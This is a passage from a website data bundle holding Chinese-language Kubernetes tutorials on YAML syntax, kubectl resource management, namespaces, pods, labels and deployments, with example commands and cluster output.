nginx:latest\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n\n\n2）执行 create 命令，创建资源：\n\n[root@master ~]# kubectl create -f nginxpod.yaml\nnamespace/dev created\npod/nginxpod created\n\n\n1\n2\n3\n\n\n此时发现创建了两个资源对象，分别是 namespace 和 pod\n\n3）执行 get 命令，查看资源：\n\n[root@master ~]#  kubectl get -f nginxpod.yaml\nNAME            STATUS   AGE\nnamespace/dev   Active   18s\n\nNAME            READY   STATUS    RESTARTS   AGE\npod/nginxpod    1/1     Running   0          17s\n\n\n1\n2\n3\n4\n5\n6\n\n\n这样就显示了两个资源对象的信息\n\n4）执行 delete 命令，删除资源：\n\n[root@master ~]# kubectl delete -f nginxpod.yaml\nnamespace "dev" deleted\npod "nginxpod" deleted\n\n\n1\n2\n3\n\n\n此时发现两个资源对象被删除了\n\n总结:\n    命令式对象配置的方式操作资源，可以简单的认为：命令  +  yaml配置文件（里面是命令需要的各种参数）\n\n\n1\n2\n\n\n\n# 声明式对象配置\n\n声明式对象配置跟命令式对象配置很相似，但是它只有一个命令 apply。\n\n# 首先执行一次kubectl apply -f yaml文件，发现创建了资源\n[root@master ~]#  kubectl apply -f nginxpod.yaml\nnamespace/dev created\npod/nginxpod created\n\n# 再次执行一次kubectl apply -f yaml文件，发现说资源没有变动\n[root@master ~]#  kubectl apply -f nginxpod.yaml\nnamespace/dev unchanged\npod/nginxpod unchanged\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n\n\n总结:\n    其实声明式对象配置就是使用apply描述一个资源最终的状态（在yaml中定义状态）\n    使用apply操作资源：\n        如果资源不存在，就创建，相当于 kubectl create\n        如果资源已存在，就更新，相当于 kubectl patch\n\n\n1\n2\n3\n4\n5\n\n\n> 扩展：kubectl 可以在 node 节点上运行吗？\n\nkubectl 的运行是需要进行配置的，它的配置文件是 $HOME/.kube，如果想要在 node 节点运行此命令，需要将 master 上的.kube 文件复制到 node 节点上，即在 master 节点上执行下面操作：\n\nscp  -r  ~/.kube   node102:~/\n\n\n1\n\n\n> 使用推荐：三种方式应该怎么用？\n> 创建 / 更新资源 使用声明式对象配置 kubectl apply -f XXX.yaml\n> 删除资源 使用命令式对象配置 kubectl delete -f XXX.yaml\n> 查询资源 使用命令式对象管理 kubectl get (describe) 资源名称',normalizedContent:'# 资源管理介绍\n\n在 kubernetes 中，所有的内容都抽象为资源，用户需要通过操作资源来管理 kubernetes。\n\n> kubernetes 的本质上就是一个集群系统，用户可以在集群中部署各种服务，所谓的部署服务，其实就是在 kubernetes 集群中运行一个个的容器，并将指定的程序跑在容器中。\n> \n> kubernetes 的最小管理单元是 pod 而不是容器，所以只能将容器放在 pod 中，而 kubernetes 一般也不会直接管理 pod，而是通过 pod控制器 来管理 pod 的。\n> \n> pod 可以提供服务之后，就要考虑如何访问 pod 中服务，kubernetes 提供了 service 资源实现这个功能。\n> \n> 当然，如果 pod 中程序的数据需要持久化，kubernetes 还提供了各种 存储 系统。\n\n\n\n> 学习 kubernetes 的核心，就是学习如何对集群上的 pod、pod控制器、service、存储 等各种资源进行操作\n\n\n# yaml 语言介绍\n\nyaml 是一个类似 xml、json 的标记性语言。它强调以数据为中心，并不是以标识语言为重点。因而 yaml 本身的定义比较简单，号称 "一种人性化的数据格式语言"。\n\n# xml 语法 或 html语法\n<heima>\n    <age>15</age>\n    <address>beijing</address>\n</heima>\n\n\n1\n2\n3\n4\n5\n\n\n# yaml 语法\nheima:\n  age: 15\n  address: beijing\n\n\n1\n2\n3\n4\n\n\nyaml 的语法比较简单，主要有下面几个：\n\n * 大小写敏感\n * 使用缩进表示层级关系\n * 缩进不允许使用 tab，只允许空格 (低版本限制)\n * 缩进的空格数不重要，只要相同层级的元素左对齐即可\n * \'#\' 表示注释\n\nyaml 支持以下几种数据类型：\n\n * 纯量：单个的、不可再分的值\n * 对象：键值对的集合，又称为映射（mapping）/ 哈希（hash） / 字典（dictionary）\n * 数组：一组按次序排列的值，又称为序列（sequence） / 列表（list）\n\n# 纯量, 就是指的一个简单的值，字符串、布尔值、整数、浮点数、null、时间、日期\n# 1 布尔类型\nc1: true (或者true)\n# 2 整型\nc2: 234\n# 3 浮点型\nc3: 3.14\n# 4 null类型 \nc4: ~  # 使用~表示null\n# 5 日期类型\nc5: 2018-02-17    # 日期必须使用iso 8601格式，即yyyy-mm-dd\n# 6 时间类型\nc6: 2018-02-17t15:02:31+08:00  # 时间使用iso 8601格式，时间和日期之间使用t连接，最后使用+代表时区\n# 7 字符串类型\nc7: heima     # 简单写法，直接写值 , 如果字符串中间有特殊字符，必须使用双引号或者单引号包裹 \nc8: line1\n    line2     # 字符串过多的情况可以拆成多行，每一行会被转化成一个空格\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n\n\n# 对象\n# 形式一(推荐):\nheima:\n  age: 15\n  address: beijing\n# 形式二(了解):\nheima: {age: 15,address: beijing}\n\n\n1\n2\n3\n4\n5\n6\n7\n\n\n# 数组\n# 形式一(推荐):\naddress:\n  - 顺义\n  - 昌平  \n# 形式二(了解):\naddress: [顺义,昌平]\n\n\n1\n2\n3\n4\n5\n6\n7\n\n\n> 小提示：\n> 1 书写 yaml 切记 : 后面要加一个空格\n> 2 如果需要将多段 yaml 配置放在一个文件中，中间要使用 --- 分隔\n> 3 下面是一个 yaml 转 json 的网站，可以通过它验证 yaml 是否书写正确\n\n\n# 资源管理方式\n\n * 命令式对象管理：直接使用命令去操作 kubernetes 资源\n   kubectl run nginx-pod --image=nginx:1.17.1 --port=80\n * 命令式对象配置：通过命令配置和配置文件去操作 kubernetes 资源\n   kubectl create/patch -f nginx-pod.yaml\n * 声明式对象配置：通过 apply 命令和配置文件去操作 kubernetes 资源\n   kubectl apply -f nginx-pod.yaml\n\n类型        操作对象   适用环境   优点        缺点\n命令式对象管理   对象     测试     简单        只能操作活动对象，无法审计、跟踪\n命令式对象配置   文件     开发     可以审计、跟踪   项目大时，配置文件多，操作麻烦\n声明式对象配置   目录     开发     支持目录操作    意外情况下难以调试\n\n\n# 命令式对象管理\n\n# kubectl 命令\n\nkubectl 是 kubernetes 集群的命令行工具，通过它能够对集群本身进行管理，并能够在集群上进行容器化应用的安装部署。kubectl 命令的语法如下：\n\nkubectl [command] [type] [name] [flags]\n\n\n1\n\n * command：指定要对资源执行的操作，例如 create、get、delete\n * type：指定资源类型，比如 deployment、pod、service\n * name：指定资源的名称，名称大小写敏感\n * flags：指定额外的可选参数\n\n# 查看所有pod\nkubectl get pod \n\n# 查看某个pod\nkubectl get pod pod_name\n\n# 查看某个pod,以yaml格式展示结果\nkubectl get pod pod_name -o yaml\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n\n\n# 资源类型\n\nkubernetes 中所有的内容都抽象为资源，可以通过下面的命令进行查看:\n\nkubectl api-resources\n\n\n1\n\n\n经常使用的资源有下面这些：\n\n资源分类         资源名称                       缩写       资源作用\n集群级别资源       nodes                      no       集群组成部分\nnamespaces   ns                         隔离 pod   \npod 资源       pods                       po       装载容器\npod 资源控制器    replicationcontrollers     rc       控制 pod 资源\n             replicasets                rs       控制 pod 资源\n             deployments                deploy   控制 pod 资源\n             daemonsets                 ds       控制 pod 资源\n             jobs                                控制 pod 资源\n             cronjobs                   cj       控制 pod 资源\n             horizontalpodautoscalers   hpa      控制 pod 资源\n             statefulsets               sts      控制 pod 资源\n服务发现资源       services                   svc      统一 pod 对外接口\n             ingress                    ing      统一 pod 对外接口\n存储资源         volumeattachments                   存储\n             persistentvolumes          pv       存储\n             persistentvolumeclaims     pvc      存储\n配置资源         configmaps                 cm       配置\n             secrets                             配置\n\n# 操作\n\nkubernetes 允许对资源进行多种操作，可以通过 --help 查看详细的操作命令\n\nkubectl --help\n\n\n1\n\n\n经常使用的操作有下面这些：\n\n命令分类    命令             翻译                 命令作用\n基本命令    create         创建                 创建一个资源\n        edit           编辑                 编辑一个资源\n        get            获取                 获取一个资源\n        patch          更新                 更新一个资源\n        delete         删除                 删除一个资源\n        explain        解释                 展示资源文档\n运行和调试   run            运行                 在集群中运行一个指定的镜像\n        expose         暴露                 暴露资源为 service\n        describe       描述                 显示资源内部信息\n        logs           日志输出容器在 pod 中的日志   输出容器在 pod 中的日志\n        attach         缠绕进入运行中的容器         进入运行中的容器\n        exec           执行容器中的一个命令         执行容器中的一个命令\n        cp             复制                 在 pod 内外复制文件\n        rollout        首次展示               管理资源的发布\n        scale          规模                 扩 (缩) 容 pod 的数量\n        autoscale      自动调整               自动调整 pod 的数量\n高级命令    apply          rc                 通过文件对资源进行配置\n        label          标签                 更新资源上的标签\n其他命令    cluster-info   集群信息               显示集群信息\n        version        版本                 显示当前 server 和 client 的版本\n\n下面以一个 namespace /pod 的创建和删除简单演示下命令的使用：\n\n# 创建一个namespace\n[root@master ~]# kubectl create namespace dev\nnamespace/dev created\n\n# 获取namespace\n[root@master ~]# kubectl get ns\nname              status   age\ndefault           active   21h\ndev               active   21s\nkube-node-lease   active   21h\nkube-public       active   21h\nkube-system       active   21h\n\n# 在此namespace下创建并运行一个nginx的pod\n[root@master ~]# kubectl run pod --image=nginx:latest -n dev\nkubectl run --generator=deployment/apps.v1 is deprecated and will be removed in a future version. use kubectl run --generator=run-pod/v1 or kubectl create instead.\ndeployment.apps/pod created\n\n# 查看新创建的pod\n[root@master ~]# kubectl get pod -n dev\nname  ready   status    restarts   age\npod   1/1     running   0          21s\n\n# 删除指定的pod\n[root@master ~]# kubectl delete pod pod-864f9875b9-pcw7x\npod "pod" deleted\n\n# 删除指定的namespace\n[root@master ~]# kubectl delete ns dev\nnamespace "dev" deleted\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n\n\n\n# 命令式对象配置\n\n命令式对象配置就是使用命令配合配置文件一起来操作 kubernetes 资源。\n1） 创建一个 nginxpod.yaml，内容如下：\n\n# 版本\napiversion: v1\n# 类型\nkind: namespace\n# 元数据\nmetadata:\n  # 名称\n  name: dev\n\n---\n\napiversion: v1\nkind: pod\nmetadata:\n  # 名称\n  name: nginxpod\n  # 所在命名空间\n  namespace: dev\n# 详细描述\nspec:\n  containers:\n  # 容器的名字\n  - name: nginx-containers\n    # 容器所用的镜像\n    image: nginx:latest\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n\n\n2）执行 create 命令，创建资源：\n\n[root@master ~]# kubectl create -f nginxpod.yaml\nnamespace/dev created\npod/nginxpod created\n\n\n1\n2\n3\n\n\n此时发现创建了两个资源对象，分别是 namespace 和 pod\n\n3）执行 get 命令，查看资源：\n\n[root@master ~]#  kubectl get -f nginxpod.yaml\nname            status   age\nnamespace/dev   active   18s\n\nname            ready   status    restarts   age\npod/nginxpod    1/1     running   0          17s\n\n\n1\n2\n3\n4\n5\n6\n\n\n这样就显示了两个资源对象的信息\n\n4）执行 delete 命令，删除资源：\n\n[root@master ~]# kubectl delete -f nginxpod.yaml\nnamespace "dev" deleted\npod "nginxpod" deleted\n\n\n1\n2\n3\n\n\n此时发现两个资源对象被删除了\n\n总结:\n    命令式对象配置的方式操作资源，可以简单的认为：命令  +  yaml配置文件（里面是命令需要的各种参数）\n\n\n1\n2\n\n\n\n# 声明式对象配置\n\n声明式对象配置跟命令式对象配置很相似，但是它只有一个命令 apply。\n\n# 首先执行一次kubectl apply -f yaml文件，发现创建了资源\n[root@master ~]#  kubectl apply -f nginxpod.yaml\nnamespace/dev created\npod/nginxpod created\n\n# 再次执行一次kubectl apply -f yaml文件，发现说资源没有变动\n[root@master ~]#  kubectl apply -f nginxpod.yaml\nnamespace/dev unchanged\npod/nginxpod unchanged\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n\n\n总结:\n    其实声明式对象配置就是使用apply描述一个资源最终的状态（在yaml中定义状态）\n    使用apply操作资源：\n        如果资源不存在，就创建，相当于 kubectl create\n        如果资源已存在，就更新，相当于 kubectl patch\n\n\n1\n2\n3\n4\n5\n\n\n> 扩展：kubectl 可以在 node 节点上运行吗？\n\nkubectl 的运行是需要进行配置的，它的配置文件是 $home/.kube，如果想要在 node 节点运行此命令，需要将 master 上的.kube 文件复制到 node 节点上，即在 master 节点上执行下面操作：\n\nscp  -r  ~/.kube   node102:~/\n\n\n1\n\n\n> 使用推荐：三种方式应该怎么用？\n> 创建 / 更新资源 使用声明式对象配置 kubectl apply -f xxx.yaml\n> 删除资源 使用命令式对象配置 kubectl delete -f xxx.yaml\n> 查询资源 使用命令式对象管理 kubectl get (describe) 资源名称',charsets:{cjk:!0}},{title:"kubernetes(四) Namespace、Pod、Lable、Deployment、Service 的资源介绍",frontmatter:{title:"kubernetes(四) Namespace、Pod、Lable、Deployment、Service 的资源介绍",date:"2023-06-25T09:22:36.000Z",permalink:"/kubernetes/603",sidebar:!0,article:!1,comment:!1,editLink:!1},regularPath:"/04.%E8%BF%90%E7%BB%B4/60.Kubernetes/603.kubernetes(%E5%9B%9B)%20Namespace%E3%80%81Pod%E3%80%81Lable%E3%80%81Deployment%E3%80%81Service%20%E7%9A%84%E8%B5%84%E6%BA%90%E4%BB%8B%E7%BB%8D.html",relativePath:"04.运维/60.Kubernetes/603.kubernetes(四) Namespace、Pod、Lable、Deployment、Service 的资源介绍.md",key:"v-be3913a8",path:"/kubernetes/603/",headers:[{level:2,title:"Namespace",slug:"namespace",normalizedTitle:"namespace",charIndex:2},{level:2,title:"Pod",slug:"pod",normalizedTitle:"pod",charIndex:107},{level:2,title:"Label",slug:"label",normalizedTitle:"label",charIndex:1735},{level:2,title:"Deployment",slug:"deployment",normalizedTitle:"deployment",charIndex:10052},{level:2,title:"Service",slug:"service",normalizedTitle:"service",charIndex:7882}],lastUpdated:"12/24/2024, 6:15:06 PM",lastUpdatedTimestamp:1735035306e3,headersStr:"Namespace Pod Label Deployment Service",content:'# Namespace\n\nNamespace 是 kubernetes 系统中的一种非常重要资源，它的主要作用是用来实现多套环境的资源隔离或者多租户的资源隔离。\n\n默认情况下，kubernetes 集群中的所有的 Pod 都是可以相互访问的。但是在实际中，可能不想让两个 Pod 之间进行互相的访问，那此时就可以将两个 Pod 划分到不同的 namespace 下。kubernetes 通过将集群内部的资源分配到不同的 Namespace 中，可以形成逻辑上的 "组"，以方便不同的组的资源进行隔离使用和管理。\n\n可以通过 kubernetes 的授权机制，将不同的 namespace 交给不同租户进行管理，这样就实现了多租户的资源隔离。此时还能结合 kubernetes 的资源配额机制，限定不同租户能占用的资源，例如 CPU 使用量、内存使用量等等，来实现租户可用资源的管理。\n\n\n\nkubernetes 在集群启动之后，会默认创建几个 namespace\n\n[root@master ~]# kubectl  get namespace\nNAME              STATUS   AGE\ndefault           Active   45h     \nkube-node-lease   Active   45h  \nkube-public       Active   45h     \nkube-system       Active   45h    \n\n\n1\n2\n3\n4\n5\n6\n\n * default 所有未指定 Namespace 的对象都会被分配在 default 命名空间\n * kube-node-lease 集群节点之间的心跳维护，v1.13 开始引入\n * kube-public 此命名空间下的资源可以被所有人访问（包括未认证用户）\n * kube-system 所有由 Kubernetes 系统创建的资源都处于这个命名空间\n\n下面来看 namespace 资源的具体操作：\n查看\n\n# 1 查看所有的ns  命令：kubectl get ns\n[root@master ~]# kubectl get ns\nNAME              STATUS   AGE\ndefault           Active   45h\nkube-node-lease   Active   45h\nkube-public       Active   45h     \nkube-system       Active   45h     \n\n# 2 查看指定的ns   命令：kubectl get ns ns名称\n[root@master ~]# kubectl get ns default\nNAME      STATUS   AGE\ndefault   Active   45h\n\n# 3 指定输出格式  命令：kubectl get ns ns名称  -o 格式参数\n# kubernetes支持的格式有很多，比较常见的是wide、json、yaml\n[root@master ~]# kubectl get ns default -o yaml\napiVersion: v1\nkind: Namespace\nmetadata:\n  creationTimestamp: "2021-05-08T04:44:16Z"\n  name: default\n  resourceVersion: "151"\n  selfLink: /api/v1/namespaces/default\n  uid: 7405f73a-e486-43d4-9db6-145f1409f090\nspec:\n  finalizers:\n  - kubernetes\nstatus:\n  phase: Active\n  \n# 4 查看ns详情  命令：kubectl describe ns ns名称\n[root@master ~]# kubectl describe ns default\nName:         default\nLabels:       <none>\nAnnotations:  <none>\nStatus:       Active  # Active 命名空间正在使用中  Terminating 正在删除命名空间\n\n# ResourceQuota 针对namespace做的资源限制\n# LimitRange针对namespace中的每个组件做的资源限制\nNo resource quota.\nNo LimitRange resource.\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n40\n41\n\n\n创建\n\n# 创建namespace\n[root@master ~]# kubectl create ns dev\nnamespace/dev created\n\n\n1\n2\n3\n\n\n删除\n\n# 删除namespace\n[root@master ~]# kubectl delete ns dev\nnamespace "dev" deleted\n\n\n1\n2\n3\n\n\n配置方式\n\napiVersion: v1\nkind: Namespace\nmetadata:\n  name: dev\n\n\n1\n2\n3\n4\n\n\n然后就可以执行对应的创建和删除命令了：\n创建：kubectl create -f ns-dev.yaml\n删除：kubectl delete -f ns-dev.yaml\n\n\n# Pod\n\nPod 是 kubernetes 集群进行管理的最小单元，程序要运行必须部署在容器中，而容器必须存在于 Pod 中。Pod 可以认为是容器的封装，一个 Pod 中可以存在一个或者多个容器。\n\n\n\nkubernetes 在集群启动之后，集群中的各个组件也都是以 Pod 方式运行的。可以通过下面命令查看：\n\n[root@master ~]# kubectl get pod -n kube-system\nNAMESPACE     NAME                             READY   STATUS    RESTARTS   AGE\nkube-system   coredns-6955765f44-68g6v         1/1     Running   0          2d1h\nkube-system   coredns-6955765f44-cs5r8         1/1     Running   0          2d1h\nkube-system   etcd-master                      1/1     Running   0          2d1h\nkube-system   kube-apiserver-master            1/1     Running   0          2d1h\nkube-system   kube-controller-manager-master   1/1     Running   0          2d1h\nkube-system   kube-flannel-ds-amd64-47r25      1/1     Running   0          2d1h\nkube-system   kube-flannel-ds-amd64-ls5lh      1/1     Running   0          2d1h\nkube-system   kube-proxy-685tk                 1/1     Running   0          2d1h\nkube-system   kube-proxy-87spt                 1/1     Running   0          2d1h\nkube-system   kube-scheduler-master            1/1     Running   0          2d1h\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n\n\n创建并运行\nkubernetes 没有提供单独运行 Pod 的命令，都是通过 Pod 控制器来实现的\n\n# 命令格式： kubectl run (pod控制器名称) [参数] \n# --image  指定Pod的镜像\n# --port   指定端口\n# --namespace  指定namespace\n[root@master ~]# kubectl run nginx --image=nginx:latest --port=80 --namespace dev \ndeployment.apps/nginx created\n\n\n1\n2\n3\n4\n5\n6\n\n\n查看 pod 信息\n\n# 查看Pod基本信息\n[root@master ~]# kubectl get pods -n dev\nNAME    READY   STATUS    RESTARTS   AGE\nnginx   1/1     Running   0          43s\n\n# 查看Pod的详细信息\n[root@master ~]# kubectl describe pod nginx -n dev\nName:         nginx\nNamespace:    dev\nPriority:     0\nNode:         node1/192.168.5.4\nStart Time:   Wed, 08 May 2021 09:29:24 +0800\nLabels:       pod-template-hash=5ff7956ff6\n              run=nginx\nAnnotations:  <none>\nStatus:       Running\nIP:           10.244.1.23\nIPs:\n  IP:           10.244.1.23\nControlled By:  ReplicaSet/nginx\nContainers:\n  nginx:\n    Container ID:   docker://4c62b8c0648d2512380f4ffa5da2c99d16e05634979973449c98e9b829f6253c\n    Image:          nginx:latest\n    Image ID:       docker-pullable://nginx@sha256:485b610fefec7ff6c463ced9623314a04ed67e3945b9c08d7e53a47f6d108dc7\n    Port:           80/TCP\n    Host Port:      0/TCP\n    State:          Running\n      Started:      Wed, 08 May 2021 09:30:01 +0800\n    Ready:          True\n    Restart Count:  0\n    Environment:    <none>\n    Mounts:\n      /var/run/secrets/kubernetes.io/serviceaccount from default-token-hwvvw (ro)\nConditions:\n  Type              Status\n  Initialized       True\n  Ready             True\n  ContainersReady   True\n  PodScheduled      True\nVolumes:\n  default-token-hwvvw:\n    Type:        Secret (a volume populated by a Secret)\n    SecretName:  default-token-hwvvw\n    Optional:    false\nQoS Class:       BestEffort\nNode-Selectors:  <none>\nTolerations:     node.kubernetes.io/not-ready:NoExecute for 300s\n                 node.kubernetes.io/unreachable:NoExecute for 300s\nEvents:\n  Type    Reason     Age        From               Message\n  ----    ------     ----       ----               -------\n  Normal  Scheduled  <unknown>  default-scheduler  Successfully assigned dev/nginx-5ff7956ff6-fg2db to node1\n  Normal  Pulling    4m11s      kubelet, node1     Pulling image "nginx:latest"\n  Normal  Pulled     3m36s      kubelet, node1     Successfully pulled image "nginx:latest"\n  Normal  Created    3m36s      kubelet, node1     Created container nginx\n  Normal  Started    3m36s      kubelet, node1     Started container nginx\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n40\n41\n42\n43\n44\n45\n46\n47\n48\n49\n50\n51\n52\n53\n54\n55\n56\n57\n\n\n访问 Pod\n\n# 获取podIP\n[root@master ~]# kubectl get pods -n dev -o wide\nNAME    READY   STATUS    RESTARTS   AGE    IP             NODE    ... \nnginx   1/1     Running   0          190s   10.244.1.23   node1   ...\n\n#访问POD\n[root@master ~]# curl http://10.244.1.23:80\n<!DOCTYPE html>\n<html>\n<head>\n\t<title>Welcome to nginx!</title>\n</head>\n<body>\n\t<p><em>Thank you for using nginx.</em></p>\n</body>\n</html>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n\n\n删除指定 Pod\n\n# 删除指定Pod\n[root@master ~]# kubectl delete pod nginx -n dev\npod "nginx" deleted\n\n# 此时，显示删除Pod成功，但是再查询，发现又新产生了一个 \n[root@master ~]# kubectl get pods -n dev\nNAME    READY   STATUS    RESTARTS   AGE\nnginx   1/1     Running   0          21s\n\n# 这是因为当前Pod是由Pod控制器创建的，控制器会监控Pod状况，一旦发现Pod死亡，会立即重建\n# 此时要想删除Pod，必须删除Pod控制器\n\n# 先来查询一下当前namespace下的Pod控制器\n[root@master ~]# kubectl get deploy -n  dev\nNAME    READY   UP-TO-DATE   AVAILABLE   AGE\nnginx   1/1     1            1           9m7s\n\n# 接下来，删除此PodPod控制器\n[root@master ~]# kubectl delete deploy nginx -n dev\ndeployment.apps "nginx" deleted\n\n# 稍等片刻，再查询Pod，发现Pod被删除了\n[root@master ~]# kubectl get pods -n dev\nNo resources found in dev namespace.\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n\n\n配置操作\n创建一个 pod-nginx.yaml，内容如下：\n这种创建方式不会像 kubectl run 在创建 Pod 时会创建 Pod 控制器，以下是不会创建 Pod 控制器的。\n\napiVersion: v1\nkind: Pod\nmetadata:\n  name: nginx\n  namespace: dev\nspec:\n  containers:\n  - image: nginx:latest\n    name: pod\n    ports:\n    - name: nginx-port\n      containerPort: 80\n      protocol: TCP\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n\n\n然后就可以执行对应的创建和删除命令了：\n创建：kubectl create -f pod-nginx.yaml\n删除：kubectl delete -f pod-nginx.yaml\n\n\n# Label\n\nLabel 是 kubernetes 系统中的一个重要概念。它的作用就是在资源上添加标识，用来对它们进行区分和选择。\n\nLabel 的特点：\n\n * 一个 Label 会以 key/value 键值对的形式附加到各种对象上，如 Node、Pod、Service 等等\n * 一个资源对象可以定义任意数量的 Label ，同一个 Label 也可以被添加到任意数量的资源对象上去\n * Label 通常在资源对象定义时确定，当然也可以在对象创建后动态添加或者删除\n\n可以通过 Label 实现资源的多维度分组，以便灵活、方便地进行资源分配、调度、配置、部署等管理工作。\n\n> 一些常用的 Label 示例如下：\n> 版本标签："version":"release", "version":"stable"......\n> 环境标签："environment":"dev"，"environment":"test"，"environment":"pro"\n> 架构标签："tier":"frontend"，"tier":"backend"\n\n标签定义完毕之后，还要考虑到标签的选择，这就要使用到 Label Selector，即：\nLabel 用于给某个资源对象定义标识\nLabel Selector 用于查询和筛选拥有某些标签的资源对象\n\n当前有两种 Label Selector：\n\n * 基于等式的 Label Selector\n   name = slave: 选择所有包含 Label 中 key="name" 且 value="slave" 的对象\n   env != production: 选择所有包括 Label 中的 key="env" 且 value 不等于 "production" 的对象\n * 基于集合的 Label Selector\n   name in (master, slave): 选择所有包含 Label 中的 key="name" 且 value="master" 或 "slave" 的对象\n   name not in (frontend): 选择所有包含 Label 中的 key="name" 且 value 不等于 "frontend" 的对象\n\n标签的选择条件可以使用多个，此时将多个 Label Selector 进行组合，使用逗号 "," 进行分隔即可。例如：\nname=slave，env!=production\nname not in (frontend)，env!=production\n\n命令方式\n\n# 为pod资源打标签\n[root@master ~]# kubectl label pod nginx-pod version=1.0 -n dev\npod/nginx-pod labeled\n\n# 为pod资源更新标签\n[root@master ~]# kubectl label pod nginx-pod version=2.0 -n dev --overwrite\npod/nginx-pod labeled\n\n# 查看标签\n[root@master ~]# kubectl get pod nginx-pod  -n dev --show-labels\nNAME        READY   STATUS    RESTARTS   AGE   LABELS\nnginx-pod   1/1     Running   0          10m   version=2.0\n\n# 筛选标签\n[root@master ~]# kubectl get pod -n dev -l version=2.0  --show-labels\nNAME        READY   STATUS    RESTARTS   AGE   LABELS\nnginx-pod   1/1     Running   0          17m   version=2.0\n[root@master ~]# kubectl get pod -n dev -l version!=2.0 --show-labels\nNo resources found in dev namespace.\n\n#删除标签\n[root@master ~]# kubectl label pod nginx-pod version- -n dev\npod/nginx-pod labeled\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n\n\n配置方式\n\napiVersion: v1\nkind: Pod\nmetadata:\n  name: nginx\n  namespace: dev\n  # 创建时添加标签\n  labels:\n    version: "3.0" \n    env: "test"\nspec:\n  containers:\n  - image: nginx:latest\n    name: pod\n    ports:\n    - name: nginx-port\n      containerPort: 80\n      protocol: TCP\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n\n\n然后就可以执行对应的更新命令了：kubectl apply -f pod-nginx.yaml\n\n\n# Deployment\n\n在 kubernetes 中，Pod 是最小的控制单元，但是 kubernetes 很少直接控制 Pod，一般都是通过 Pod 控制器来完成的。Pod 控制器用于 pod 的管理，确保 pod 资源符合预期的状态，当 pod 的资源出现故障时，会尝试进行重启或重建 pod。\n\n在 kubernetes 中 Pod 控制器的种类有很多，本章节只介绍一种：Deployment。\n\n\n\n命令操作\n\n# 命令格式: kubectl run Deployment名称  [参数] \n# --image  指定pod的镜像\n# --port   指定端口\n# --replicas  指定创建pod数量\n# --namespace  指定namespace\n[root@master ~]# kubectl run nginx --image=nginx:latest --port=80 --replicas=3 -n dev\ndeployment.apps/nginx created\n\n# 查看创建的Pod\n[root@master ~]# kubectl get pods -n dev\nNAME                     READY   STATUS    RESTARTS   AGE\nnginx-5ff7956ff6-6k8cb   1/1     Running   0          19s\nnginx-5ff7956ff6-jxfjt   1/1     Running   0          19s\nnginx-5ff7956ff6-v6jqw   1/1     Running   0          19s\n\n# 查看deployment的信息\n[root@master ~]# kubectl get deploy -n dev\nNAME    READY   UP-TO-DATE   AVAILABLE   AGE\nnginx   3/3     3            3           2m42s\n\n# UP-TO-DATE：成功升级的副本数量\n# AVAILABLE：可用副本的数量\n[root@master ~]# kubectl get deploy -n dev -o wide\nNAME    READY UP-TO-DATE  AVAILABLE   AGE     CONTAINERS   IMAGES              SELECTOR\nnginx   3/3     3         3           2m51s   nginx        nginx:latest        run=nginx\n\n# 查看deployment的详细信息\n[root@master ~]# kubectl describe deploy nginx -n dev\nName:                   nginx\nNamespace:              dev\nCreationTimestamp:      Wed, 08 May 2021 11:14:14 +0800\nLabels:                 run=nginx\nAnnotations:            deployment.kubernetes.io/revision: 1\nSelector:               run=nginx\nReplicas:               3 desired | 3 updated | 3 total | 3 available | 0 unavailable\nStrategyType:           RollingUpdate\nMinReadySeconds:        0\nRollingUpdateStrategy:  25% max unavailable, 25% max surge\nPod Template:\n  Labels:  run=nginx\n  Containers:\n   nginx:\n    Image:        nginx:latest\n    Port:         80/TCP\n    Host Port:    0/TCP\n    Environment:  <none>\n    Mounts:       <none>\n  Volumes:        <none>\nConditions:\n  Type           Status  Reason\n  ----           ------  ------\n  Available      True    MinimumReplicasAvailable\n  Progressing    True    NewReplicaSetAvailable\nOldReplicaSets:  <none>\nNewReplicaSet:   nginx-5ff7956ff6 (3/3 replicas created)\nEvents:\n  Type    Reason             Age    From                   Message\n  ----    ------             ----   ----                   -------\n  Normal  ScalingReplicaSet  5m43s  deployment-controller  Scaled up replicaset nginx-5ff7956ff6 to 3\n  \n# 删除,对应的pod也会删除\n[root@master ~]# kubectl delete deploy nginx -n dev\ndeployment.apps "nginx" deleted\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n40\n41\n42\n43\n44\n45\n46\n47\n48\n49\n50\n51\n52\n53\n54\n55\n56\n57\n58\n59\n60\n61\n62\n63\n\n\n配置操作\n创建一个 deploy-nginx.yaml，内容如下：\n\napiVersion: 